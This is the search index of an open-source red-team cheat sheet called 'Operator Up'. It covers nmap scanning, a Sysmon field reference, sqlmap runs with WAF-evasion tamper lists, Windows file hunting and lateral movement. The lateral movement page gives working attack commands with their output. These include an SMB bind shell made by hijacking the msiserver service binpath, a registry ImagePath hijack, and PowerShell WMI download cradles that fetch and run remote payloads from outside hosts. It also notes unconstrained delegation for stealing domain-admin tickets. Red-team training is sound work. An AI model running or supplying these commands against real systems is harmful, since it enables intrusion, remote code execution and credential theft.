{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Your one stop resource for operational hints. What is this project? \u00b6 This project aims to provide a single source of common operational hints seen on Web/Application , Network , and Red Team assessments. While this project is scalable, it may not cover every single scenario applicable to your needs, thats why we need feedback. Please understand that this is **Open Source* project that is driven by community feedback. If you do not contribute, who will? Please take the time to correct, update, or even make a pull request when you are feeling up to the task.* Status of Operator Up \u00b6 This project is purely dirven by operators and commands of operators on live OPs. that being said it does have some basic development efforts to maintain it and ensure content is accurate. Branch Status Master Table of Contents \u00b6 Windows \u00b6 Windows Privilege Escalation Commands Windows Situational Awareness Commands Windows Remote Situational Awareness Commands Windows Network Situational Awareness Commands Windows Lateral Movement Windows Remote Alteration Windows Persistence Windows Collection Operations Scanning \u00b6 NMAP Scanning Techniques Web Application \u00b6 SQL Injections","title":"Home"},{"location":"#what-is-this-project","text":"This project aims to provide a single source of common operational hints seen on Web/Application , Network , and Red Team assessments. While this project is scalable, it may not cover every single scenario applicable to your needs, thats why we need feedback. Please understand that this is **Open Source* project that is driven by community feedback. If you do not contribute, who will? Please take the time to correct, update, or even make a pull request when you are feeling up to the task.*","title":"What is this project?"},{"location":"#status-of-operator-up","text":"This project is purely dirven by operators and commands of operators on live OPs. that being said it does have some basic development efforts to maintain it and ensure content is accurate. Branch Status Master","title":"Status of Operator Up"},{"location":"#table-of-contents","text":"","title":"Table of Contents"},{"location":"#windows","text":"Windows Privilege Escalation Commands Windows Situational Awareness Commands Windows Remote Situational Awareness Commands Windows Network Situational Awareness Commands Windows Lateral Movement Windows Remote Alteration Windows Persistence Windows Collection Operations","title":"Windows"},{"location":"#scanning","text":"NMAP Scanning Techniques","title":"Scanning"},{"location":"#web-application","text":"SQL Injections","title":"Web Application"},{"location":"building/","text":"Building Operator Up Docs \u00b6 Setup Development Environment \u00b6 First make sure you have poetry installed, then initialize your virtual environment with the following commands: Install the requirements: poetry install Start the venv shell: poetry shell Start The Local Development Server \u00b6 you can start adding and hacking away on the documenting with live reload. We use this to ensure all documentation nicely fits on the page and any content added will be seamless for users. mkdocs serve","title":"Building"},{"location":"building/#building-operator-up-docs","text":"","title":"Building Operator Up Docs"},{"location":"building/#setup-development-environment","text":"First make sure you have poetry installed, then initialize your virtual environment with the following commands: Install the requirements: poetry install Start the venv shell: poetry shell","title":"Setup Development Environment"},{"location":"building/#start-the-local-development-server","text":"you can start adding and hacking away on the documenting with live reload. We use this to ensure all documentation nicely fits on the page and any content added will be seamless for users. mkdocs serve","title":"Start The Local Development Server"},{"location":"contributing/","text":"Contributing \u00b6 Interested in contributing to Operator Up? Want to report a issue? Before you do, please read the following guidelines. Submission context \u00b6 Got a question or problem? \u00b6 For quick questions there's no need to open an issue as you can reach us on gitter.im. Need to make a correction to the content? \u00b6 If you found a bug within the docs, you can help us by submitting an issue to the issue tracker in our GitHub repository. Even better, you can submit a Pull Request with a fix. However, before doing so, please read the submission guidelines. Missing a TTP, Section, Tool Cheat sheet? \u00b6 You can request a new feature by submitting an issue to our GitHub Repository. If you would like to implement a new section, please submit an issue with a proposal for your work first, to be sure that it is of use for everyone. Please consider what kind of change it is: For a major section, first open an issue and outline your proposal so that it can be discussed. This will also allow us to better coordinate our efforts, prevent duplication of work, and help you to craft the change so that it is successfully accepted into the project. Small tool additions, cheet sheets and TTPs can be crafted and directly submitted as a Pull Request. However, there is no guarantee that your PR will make it into the master, as it's always a matter of opinion whether if benefits the overall project. Submission guidelines \u00b6 Submitting an issue \u00b6 Before you submit an issue, please search the issue tracker, maybe an issue for your problem already exists and the discussion might inform you of workarounds readily available. We want to fix all the issues as soon as possible, but before fixing a bug we need to reproduce and confirm it. In order to reproduce bugs we will systematically ask you to provide a minimal reproduction scenario using the custom issue template. Please stick to the issue template. Submitting a Pull Request (PR) \u00b6 Search GitHub for an open or closed PR that relates to your submission. You don't want to duplicate effort. If you do not find a related issue or PR, go ahead. Development : Fork the project, set up the development environment, make your changes in a separate git branch and add descriptive messages to your commits. Build : Before submitting a pull requests, build the docs using mkdocs . This is a mandatory requirement for your PR to get accepted, as all docs must be compiled and pass our CI before we accept it. Pull Request : After building the docs, commit the compiled output, push your branch to GitHub and send a PR to the master branch. If we suggest changes, make the required updates, rebase your branch and push the changes to your GitHub repository, which will automatically update your PR. After your PR is merged, you can safely delete your branch and pull the changes from the main (upstream) repository. Acknowledgments \u00b6 This page is based off: https://squidfunk.github.io/mkdocs-material/contributing/ as they have a great submission criteria setup.","title":"Contributing"},{"location":"contributing/#contributing","text":"Interested in contributing to Operator Up? Want to report a issue? Before you do, please read the following guidelines.","title":"Contributing"},{"location":"contributing/#submission-context","text":"","title":"Submission context"},{"location":"contributing/#got-a-question-or-problem","text":"For quick questions there's no need to open an issue as you can reach us on gitter.im.","title":"Got a question or problem?"},{"location":"contributing/#need-to-make-a-correction-to-the-content","text":"If you found a bug within the docs, you can help us by submitting an issue to the issue tracker in our GitHub repository. Even better, you can submit a Pull Request with a fix. However, before doing so, please read the submission guidelines.","title":"Need to make a correction to the content?"},{"location":"contributing/#missing-a-ttp-section-tool-cheat-sheet","text":"You can request a new feature by submitting an issue to our GitHub Repository. If you would like to implement a new section, please submit an issue with a proposal for your work first, to be sure that it is of use for everyone. Please consider what kind of change it is: For a major section, first open an issue and outline your proposal so that it can be discussed. This will also allow us to better coordinate our efforts, prevent duplication of work, and help you to craft the change so that it is successfully accepted into the project. Small tool additions, cheet sheets and TTPs can be crafted and directly submitted as a Pull Request. However, there is no guarantee that your PR will make it into the master, as it's always a matter of opinion whether if benefits the overall project.","title":"Missing a TTP, Section, Tool Cheat sheet?"},{"location":"contributing/#submission-guidelines","text":"","title":"Submission guidelines"},{"location":"contributing/#submitting-an-issue","text":"Before you submit an issue, please search the issue tracker, maybe an issue for your problem already exists and the discussion might inform you of workarounds readily available. We want to fix all the issues as soon as possible, but before fixing a bug we need to reproduce and confirm it. In order to reproduce bugs we will systematically ask you to provide a minimal reproduction scenario using the custom issue template. Please stick to the issue template.","title":"Submitting an issue"},{"location":"contributing/#submitting-a-pull-request-pr","text":"Search GitHub for an open or closed PR that relates to your submission. You don't want to duplicate effort. If you do not find a related issue or PR, go ahead. Development : Fork the project, set up the development environment, make your changes in a separate git branch and add descriptive messages to your commits. Build : Before submitting a pull requests, build the docs using mkdocs . This is a mandatory requirement for your PR to get accepted, as all docs must be compiled and pass our CI before we accept it. Pull Request : After building the docs, commit the compiled output, push your branch to GitHub and send a PR to the master branch. If we suggest changes, make the required updates, rebase your branch and push the changes to your GitHub repository, which will automatically update your PR. After your PR is merged, you can safely delete your branch and pull the changes from the main (upstream) repository.","title":"Submitting a Pull Request (PR)"},{"location":"contributing/#acknowledgments","text":"This page is based off: https://squidfunk.github.io/mkdocs-material/contributing/ as they have a great submission criteria setup.","title":"Acknowledgments"},{"location":"license/","text":"BSD 3-Clause License Copyright \u00a9 2020, Obscurity Labs All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAM","title":"License"},{"location":"osint/email/","text":"","title":"Email"},{"location":"scanning/nmap/","text":"NMAP Scanning Techniques \u00b6 Internal Host Discovery \u00b6 Tip A few small tips about the following nmap scanning string: 255 min host group is recommended. min rate 6000 is recommended to keep kernel pumping packets. nmap -Pn -n -sS -vvv -p 21 -23,25,53,111,137,139,445,80,443,8443,8080 \\ --min-hostgroup 255 \\ --min-rtt-timeout 0ms \\ --max-rtt-timeout 100ms \\ --max-retries 1 \\ --max-scan-delay 0 \\ --min-rate 6000 \\ --open \\ -oA CLIENT-# \\ -iL <IPLIST> Internal Full Scope Hit and Run String using Syn Half Scan \u00b6 Tip A few small tips about the following nmap scanning string: 255 min host group is recommended. min rate 1000 should be fine for internal scanning with decent accuracy of results. Full Port Scan / --open is used for further parsing. nmap -Pn -n -sS -p- -sV -vvv --min-hostgroup 255 \\ --min-rtt-timeout 25ms \\ --max-rtt-timeout 100ms \\ --max-retries 1 \\ --max-scan-delay 0 \\ --min-rate 1000 \\ --open \\ -oA <customer-#> \\ -iL <IPLIST>","title":"nmap"},{"location":"scanning/nmap/#nmap-scanning-techniques","text":"","title":"NMAP Scanning Techniques"},{"location":"scanning/nmap/#internal-host-discovery","text":"Tip A few small tips about the following nmap scanning string: 255 min host group is recommended. min rate 6000 is recommended to keep kernel pumping packets. nmap -Pn -n -sS -vvv -p 21 -23,25,53,111,137,139,445,80,443,8443,8080 \\ --min-hostgroup 255 \\ --min-rtt-timeout 0ms \\ --max-rtt-timeout 100ms \\ --max-retries 1 \\ --max-scan-delay 0 \\ --min-rate 6000 \\ --open \\ -oA CLIENT-# \\ -iL <IPLIST>","title":"Internal Host Discovery"},{"location":"scanning/nmap/#internal-full-scope-hit-and-run-string-using-syn-half-scan","text":"Tip A few small tips about the following nmap scanning string: 255 min host group is recommended. min rate 1000 should be fine for internal scanning with decent accuracy of results. Full Port Scan / --open is used for further parsing. nmap -Pn -n -sS -p- -sV -vvv --min-hostgroup 255 \\ --min-rtt-timeout 25ms \\ --max-rtt-timeout 100ms \\ --max-retries 1 \\ --max-scan-delay 0 \\ --min-rate 1000 \\ --open \\ -oA <customer-#> \\ -iL <IPLIST>","title":"Internal Full Scope Hit and Run String using Syn Half Scan"},{"location":"soc/sysmon/sysmon/","text":"Sysmon \u00b6 Sysmon Cheatsheet \u00b6 EventID 1 Process Create \u00b6 The process creation event provides extended information about a newly created process. The full command line provides context on the process execution. The ProcessGUID field is a unique value for this process across a domain to make event correlation easier. The hash is a full hash of the file with the algorithms in the HashType field. Field Detail UtcTime Time in UTC when event was created ProcessGuid Process Guid of the process that got spawned/created (child) ProcessId Process ID used by the OS to identify the created process (child) Image File path of the process being spawned/created. Considered also the child or source process FileVersion Version of the image associated with the main process (child) Description Description of the image associated with the main process (child) Product Product name the image associated with the main process (child) belongs to OriginalFileName OriginalFileName from the PE header, added on compilation Company Company name the image associated with the main process (child) belongs to CommandLine Arguments which were passed to the executable associated with the main process CurrentDirectory The path without the name of the image associated with the process User Name of the account that created the process (child) . It usually contains domain name and username LogonGuid Logon GUID of the user who created the new process. Value that can help you correlate this event with others that contain the same Logon GUID LogonId Login ID of the user who created the new process. Value that can help you correlate this event with others that contain the same Logon ID TerminalSessionId ID of the session the user belongs to IntegrityLevel Integrity label assigned to a process Hashes Full hash of the file with the algorithms in the HashType field ParentProcessGuid ProcessGUID of the process that spawned/created the main process (child) ParentProcessId Process ID of the process that spawned/created the main process (child) ParentImage File path that spawned/created the main process ParentCommandLine Arguments which were passed to the executable associated with the parent process ParentUser Name of the account that created the parent process. It usually contains domain name and username Elastic ECS Mapping \u00b6 ECS Event Mapping Field Data (Example) Sysmon Field Mapping event.action N/A event.category process event.code 1 event.created Jan 30, 2022 @ 21:51:17.092 UtcTime event.kind event event.module sysmon N/A event.provider Microsoft-Windows-Sysmon N/A event.type start, process_start n/a hash.imphash b71cb3ac5c352bec857c940cbc95f0f3 Hashes hash.md5 60ff40cfd7fb8fe41ee4fe9ae5fe1c51 Hashes hash.sha1 3ea7cc0 Hashes hash.sha256 2198a7b58bccb758036b969ddae6cc2ece07565e2659a7c541a313a0492231a3 Hashes process.args C:\\Windows\\system32\\rundll32.exe, C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask CommandLine process.command_line C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask CommandLine process.entity_id {a754cc8d-0794-61f8-d001-000000000d00} ProcessGuid process.executable C:\\Windows\\System32\\rundll32.exe Image process.parent.args C:\\Windows\\system32\\svchost.exe, -k, netsvcs, -p, -s, Schedule ParentCommandLine process.parent.command_line C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule ParentCommandLine process.parent.entity_id {a754cc8d-d9d1-61f7-2600-000000000d00} ParentProcessGuid process.parent.name svchost.exe ParentImage process.parent.pid 1632 ParentProcessId process.pe.company Microsoft Corporation Company process.pe.description Windows host process (Rundll32) Description process.pe.product Microsoft\u00ae Windows\u00ae Operating System Product process.pid 5316 ProcessId process.working_directory C:\\Windows\\system32\\ CurrentDirectory related.hash dd399ae , ef3179d498793bf4234f708d3be28633, b53f3c0cd32d7f20849850768da6431e5f876b7bfa61db0aa0700b02873393fa, 4db27267734d1576d75c991dc70f68ac Hashes related.user SYSTEM User user.domain NT AUTHORITY User user.id S-1-5-18 LogonId user.name SYSTEM User EventID 2 File creation time changed \u00b6","title":"sysmon"},{"location":"soc/sysmon/sysmon/#sysmon","text":"","title":"Sysmon"},{"location":"soc/sysmon/sysmon/#sysmon-cheatsheet","text":"","title":"Sysmon Cheatsheet"},{"location":"soc/sysmon/sysmon/#eventid-1-process-create","text":"The process creation event provides extended information about a newly created process. The full command line provides context on the process execution. The ProcessGUID field is a unique value for this process across a domain to make event correlation easier. The hash is a full hash of the file with the algorithms in the HashType field. Field Detail UtcTime Time in UTC when event was created ProcessGuid Process Guid of the process that got spawned/created (child) ProcessId Process ID used by the OS to identify the created process (child) Image File path of the process being spawned/created. Considered also the child or source process FileVersion Version of the image associated with the main process (child) Description Description of the image associated with the main process (child) Product Product name the image associated with the main process (child) belongs to OriginalFileName OriginalFileName from the PE header, added on compilation Company Company name the image associated with the main process (child) belongs to CommandLine Arguments which were passed to the executable associated with the main process CurrentDirectory The path without the name of the image associated with the process User Name of the account that created the process (child) . It usually contains domain name and username LogonGuid Logon GUID of the user who created the new process. Value that can help you correlate this event with others that contain the same Logon GUID LogonId Login ID of the user who created the new process. Value that can help you correlate this event with others that contain the same Logon ID TerminalSessionId ID of the session the user belongs to IntegrityLevel Integrity label assigned to a process Hashes Full hash of the file with the algorithms in the HashType field ParentProcessGuid ProcessGUID of the process that spawned/created the main process (child) ParentProcessId Process ID of the process that spawned/created the main process (child) ParentImage File path that spawned/created the main process ParentCommandLine Arguments which were passed to the executable associated with the parent process ParentUser Name of the account that created the parent process. It usually contains domain name and username","title":"EventID 1 Process Create"},{"location":"soc/sysmon/sysmon/#elastic-ecs-mapping","text":"ECS Event Mapping Field Data (Example) Sysmon Field Mapping event.action N/A event.category process event.code 1 event.created Jan 30, 2022 @ 21:51:17.092 UtcTime event.kind event event.module sysmon N/A event.provider Microsoft-Windows-Sysmon N/A event.type start, process_start n/a hash.imphash b71cb3ac5c352bec857c940cbc95f0f3 Hashes hash.md5 60ff40cfd7fb8fe41ee4fe9ae5fe1c51 Hashes hash.sha1 3ea7cc0 Hashes hash.sha256 2198a7b58bccb758036b969ddae6cc2ece07565e2659a7c541a313a0492231a3 Hashes process.args C:\\Windows\\system32\\rundll32.exe, C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask CommandLine process.command_line C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask CommandLine process.entity_id {a754cc8d-0794-61f8-d001-000000000d00} ProcessGuid process.executable C:\\Windows\\System32\\rundll32.exe Image process.parent.args C:\\Windows\\system32\\svchost.exe, -k, netsvcs, -p, -s, Schedule ParentCommandLine process.parent.command_line C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule ParentCommandLine process.parent.entity_id {a754cc8d-d9d1-61f7-2600-000000000d00} ParentProcessGuid process.parent.name svchost.exe ParentImage process.parent.pid 1632 ParentProcessId process.pe.company Microsoft Corporation Company process.pe.description Windows host process (Rundll32) Description process.pe.product Microsoft\u00ae Windows\u00ae Operating System Product process.pid 5316 ProcessId process.working_directory C:\\Windows\\system32\\ CurrentDirectory related.hash dd399ae , ef3179d498793bf4234f708d3be28633, b53f3c0cd32d7f20849850768da6431e5f876b7bfa61db0aa0700b02873393fa, 4db27267734d1576d75c991dc70f68ac Hashes related.user SYSTEM User user.domain NT AUTHORITY User user.id S-1-5-18 LogonId user.name SYSTEM User","title":"Elastic ECS Mapping"},{"location":"soc/sysmon/sysmon/#eventid-2-file-creation-time-changed","text":"","title":"EventID 2 File creation time changed"},{"location":"web_app/sql_injections/","text":"SQL Injections \u00b6 SQLMap \u00b6 Clone from dev for bleeding edge: \u00b6 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev Run SQLMap via a file \u00b6 python sqlmap-dev/sqlmap.py -r login-request.txt Run from file with threads: \u00b6 python sqlmap-dev/sqlmap.py -r login-request.txt --threads=10 Run from file with threads and level: \u00b6 python sqlmap-dev/sqlmap.py -r login-request.txt --level=5 --risk=3 Tamper all the things: \u00b6 General Tamper Testing: \u00b6 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes MSSQL Tamper Testing: \u00b6 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes MySQL Tamper Testing: \u00b6 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor","title":"SQL Injections"},{"location":"web_app/sql_injections/#sql-injections","text":"","title":"SQL Injections"},{"location":"web_app/sql_injections/#sqlmap","text":"","title":"SQLMap"},{"location":"web_app/sql_injections/#clone-from-dev-for-bleeding-edge","text":"git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev","title":"Clone from dev for bleeding edge:"},{"location":"web_app/sql_injections/#run-sqlmap-via-a-file","text":"python sqlmap-dev/sqlmap.py -r login-request.txt","title":"Run SQLMap via a file"},{"location":"web_app/sql_injections/#run-from-file-with-threads","text":"python sqlmap-dev/sqlmap.py -r login-request.txt --threads=10","title":"Run from file with threads:"},{"location":"web_app/sql_injections/#run-from-file-with-threads-and-level","text":"python sqlmap-dev/sqlmap.py -r login-request.txt --level=5 --risk=3","title":"Run from file with threads and level:"},{"location":"web_app/sql_injections/#tamper-all-the-things","text":"","title":"Tamper all the things:"},{"location":"web_app/sql_injections/#general-tamper-testing","text":"tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes","title":"General Tamper Testing:"},{"location":"web_app/sql_injections/#mssql-tamper-testing","text":"tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes","title":"MSSQL Tamper Testing:"},{"location":"web_app/sql_injections/#mysql-tamper-testing","text":"tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor","title":"MySQL Tamper Testing:"},{"location":"windows/collection_operations/","text":"Windows Collection Operations \u00b6 File Share Hunting \u00b6 Decrypt VBE scripts: \u00b6 https://blog.didierstevens.com/2016/03/29/decoding-vbe/ look for all items in a directory with the * file format \u00b6 Here some interesting examples: Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. vsdx Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. vsd Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. dmg Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. pptx Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. docx Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. vsd Look for all XLS files that are password protected (Binary Format) \u00b6 Get-ChildItem -path C :\\ -recurse | foreach { gc -encoding byte -TotalCount 3000 -ReadCount 20 ./ $_ |% { \"{0:x2}\" -f $_ } | Select-String -Pattern \"13 00 02 00\" |% { $_ -match '13 00 02 00 (.{5})' }; $matches [ 1 ]}","title":"Collection Operations"},{"location":"windows/collection_operations/#windows-collection-operations","text":"","title":"Windows Collection Operations"},{"location":"windows/collection_operations/#file-share-hunting","text":"","title":"File Share Hunting"},{"location":"windows/collection_operations/#decrypt-vbe-scripts","text":"https://blog.didierstevens.com/2016/03/29/decoding-vbe/","title":"Decrypt VBE scripts:"},{"location":"windows/collection_operations/#look-for-all-items-in-a-directory-with-the-file-format","text":"Here some interesting examples: Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. vsdx Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. vsd Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. dmg Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. pptx Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. docx Get-ChildItem H :\\ DIR-TO-SCAN -Recurse -name *. vsd","title":"look for all items in a directory with the * file format"},{"location":"windows/collection_operations/#look-for-all-xls-files-that-are-password-protected-binary-format","text":"Get-ChildItem -path C :\\ -recurse | foreach { gc -encoding byte -TotalCount 3000 -ReadCount 20 ./ $_ |% { \"{0:x2}\" -f $_ } | Select-String -Pattern \"13 00 02 00\" |% { $_ -match '13 00 02 00 (.{5})' }; $matches [ 1 ]}","title":"Look for all XLS files that are password protected (Binary Format)"},{"location":"windows/lat_movement/","text":"Windows Lateral Movement \u00b6 Native SMB \u00b6 SMB Bind Shell via remote.exe & Service (SC) \u00b6 Move remote.exe to target : net use T: \\\\192.168.1.[x]\\C$ move remote.exe T:\\ Target service to be started C:\\Users\\gte-1>sc.exe \\\\192.168.1.118 qc msiserver [SC] QueryServiceConfig SUCCESS SERVICE_NAME: msiserver TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\system32\\msiexec.exe /V LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Installer DEPENDENCIES : RpcSs SERVICE_START_NAME : LocalSystem Set Target Bin Path sc \\\\192.168.1.118 config msiserver binpath= \"cmd.exe /C start /B C:\\remote.exe /S cmd.exe pwnme\" Check Target Bin Path C:\\Users\\gte-1>sc.exe \\\\192.168.1.118 qc msiserver [SC] QueryServiceConfig SUCCESS SERVICE_NAME: msiserver TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : cmd.exe /C /B C:\\remote.exe /S cmd.exe pwnme LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Installer DEPENDENCIES : RpcSs SERVICE_START_NAME : LocalSystem Execute target remote.exe payload C:\\Users\\gte-1>sc.exe \\\\192.168.1.118 start msiserver [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. Connect to SMB bind shell C:\\Users\\gte-1>\"\\\\WIN-5696DUCBS1B\\team-share\\GTE-Labs\\Day 4\\Lab 2\\remote.exe\" /C 192.168.1.118 \"pwnme\" ************************************** *********** REMOTE ************ *********** CLIENT ************ ************************************** Connected... ]Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. C:\\WINDOWS\\system32> **Remote: Connected to GTE-WIN7-1-PC gte-1 [Thu 8:50 AM] Clean Up Target C:\\Users\\gte-1>sc \\\\192.168.1.118 config msiserver binpath= \"C:\\WINDOWS\\system32 \\msiexec.exe /V\" [SC] ChangeServiceConfig SUCCESS ******ESCAPE QUOTES IF NEEDED****** sc \\\\192.168.1.177 config msiserver binpath= \"\\\"C:\\WINDOWS\\system32\\msiexec.exe /V\\\"\" Alt move patern via Reg Edit reg add \\\\192.168.1.177\\hklm\\system\\currentcontrolset\\services\\msiserver /v ImagePath /t REG_EXPAND_SZ /d \"cmd /c start /b c:\\windows\\system32\\remote.exe /s cmd.exe pwnme\" /f Powershell Lateral Movement \u00b6 WMI Internal Reverse Port Forward \u00b6 Reverse portforward staged payload internal -> a download cradle Invoke-WmiMethod -ComputerName 43 .*.*.* -Class Win32_Process -Name Create -ArgumentList \"powershell.exe -w 1 -C `\" &([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://43.*.*.*:10080/updates/updater'))-Join''))) `\" \" Reverse portforward staged payload internal -> a download cradle -> with PS creds $credential = New-Object System . Management . Automation . PSCredential ( \"DA\\some\" ,( \"TestPassword\" | ConvertTo-SecureString -AsPlainText -Force )); $cmd = \"powershell.exe -w 1 -C `\" &([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://test.com/download/test'))-Join''))) `\" \" ; Invoke-WmiMethod -ComputerName '43.160.34.168' -Credential $credential Win32_Process -Name 'Create' -ArgumentList $cmd Unconstrained delegation to attack DA or user credentials \u00b6 Powershell and PowerView list of servers that allow for unconstrained delegation to attack DA or user credentials: powerpick Get-DomainComputer -Unconstrained > Then e-mail DA with a 1x1px image to a UNC path . > TGS Service ticket is delivered to compromised server and stored in LSASS > Can extract and use TGT until it expires . > Can be used to get krbtgt","title":"Lateral Movement"},{"location":"windows/lat_movement/#windows-lateral-movement","text":"","title":"Windows Lateral Movement"},{"location":"windows/lat_movement/#native-smb","text":"","title":"Native SMB"},{"location":"windows/lat_movement/#smb-bind-shell-via-remoteexe-service-sc","text":"Move remote.exe to target : net use T: \\\\192.168.1.[x]\\C$ move remote.exe T:\\ Target service to be started C:\\Users\\gte-1>sc.exe \\\\192.168.1.118 qc msiserver [SC] QueryServiceConfig SUCCESS SERVICE_NAME: msiserver TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\system32\\msiexec.exe /V LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Installer DEPENDENCIES : RpcSs SERVICE_START_NAME : LocalSystem Set Target Bin Path sc \\\\192.168.1.118 config msiserver binpath= \"cmd.exe /C start /B C:\\remote.exe /S cmd.exe pwnme\" Check Target Bin Path C:\\Users\\gte-1>sc.exe \\\\192.168.1.118 qc msiserver [SC] QueryServiceConfig SUCCESS SERVICE_NAME: msiserver TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : cmd.exe /C /B C:\\remote.exe /S cmd.exe pwnme LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Installer DEPENDENCIES : RpcSs SERVICE_START_NAME : LocalSystem Execute target remote.exe payload C:\\Users\\gte-1>sc.exe \\\\192.168.1.118 start msiserver [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. Connect to SMB bind shell C:\\Users\\gte-1>\"\\\\WIN-5696DUCBS1B\\team-share\\GTE-Labs\\Day 4\\Lab 2\\remote.exe\" /C 192.168.1.118 \"pwnme\" ************************************** *********** REMOTE ************ *********** CLIENT ************ ************************************** Connected... ]Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. C:\\WINDOWS\\system32> **Remote: Connected to GTE-WIN7-1-PC gte-1 [Thu 8:50 AM] Clean Up Target C:\\Users\\gte-1>sc \\\\192.168.1.118 config msiserver binpath= \"C:\\WINDOWS\\system32 \\msiexec.exe /V\" [SC] ChangeServiceConfig SUCCESS ******ESCAPE QUOTES IF NEEDED****** sc \\\\192.168.1.177 config msiserver binpath= \"\\\"C:\\WINDOWS\\system32\\msiexec.exe /V\\\"\" Alt move patern via Reg Edit reg add \\\\192.168.1.177\\hklm\\system\\currentcontrolset\\services\\msiserver /v ImagePath /t REG_EXPAND_SZ /d \"cmd /c start /b c:\\windows\\system32\\remote.exe /s cmd.exe pwnme\" /f","title":"SMB Bind Shell via remote.exe &amp; Service (SC)"},{"location":"windows/lat_movement/#powershell-lateral-movement","text":"","title":"Powershell Lateral Movement"},{"location":"windows/lat_movement/#wmi-internal-reverse-port-forward","text":"Reverse portforward staged payload internal -> a download cradle 